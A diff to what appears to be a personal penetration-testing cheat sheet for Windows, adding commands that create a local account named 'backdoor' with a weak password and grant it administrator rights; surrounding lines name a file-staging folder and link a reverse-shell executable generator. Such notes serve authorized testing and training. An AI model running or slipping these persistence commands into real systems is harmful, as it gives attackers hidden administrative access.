@@ -185,6 +185,14 @@ Good dir to save, download and write files:
 
 	C:\Users\Public\
 
+Add backdoor account as admin user:
+
+	net user /add backdoor Password1
+	net localgroup administrators /add backdoor
+
+	Confirm that it has been added: net locagroup administrators
+
+
 ## Payloads
 
 Use https://github.com/Andre92Marcos/myScripts/blob/main/rev_shell_exe.c to generate a reverse shell exe:
